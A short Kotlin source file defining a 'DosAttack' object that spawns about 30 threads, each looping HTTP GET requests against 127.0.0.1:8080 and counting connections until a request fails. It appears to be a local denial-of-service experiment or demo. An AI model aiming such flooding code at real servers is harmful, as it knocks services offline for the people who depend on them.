package org.fpeterek.dos

import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import kotlin.concurrent.thread

object DosAttack {

    private val isRunningValue = AtomicBoolean(false)

    private val connCounter = AtomicInteger(0)
    private val outputConnCount = AtomicBoolean(true)

    private var isRunning
        get() = isRunningValue.get()
        set(value) = isRunningValue.set(value)

    private var threads = listOf<Thread>()

    val connections
        get() = connCounter.get()

    private val callerThread
        get() = thread {

            while (isRunning) {
                try {
                    val req = HttpClient.get("127.0.0.1", 8080)
                    val conns = connCounter.incrementAndGet()
                    req.close()
                    if (!req.isSuccessful && outputConnCount.get()) {
                        println("Connections created: $conns")
                        outputConnCount.set(false)
                    }
                } catch (e: Exception) {
                    // noop
                }
            }
        }

    fun start(threadCount: Int = 30) {
        isRunning = true
        threads = (0..threadCount).map { callerThread }
    }

    fun stop() {
        isRunning = false
        threads.forEach { it.join() }
    }

}
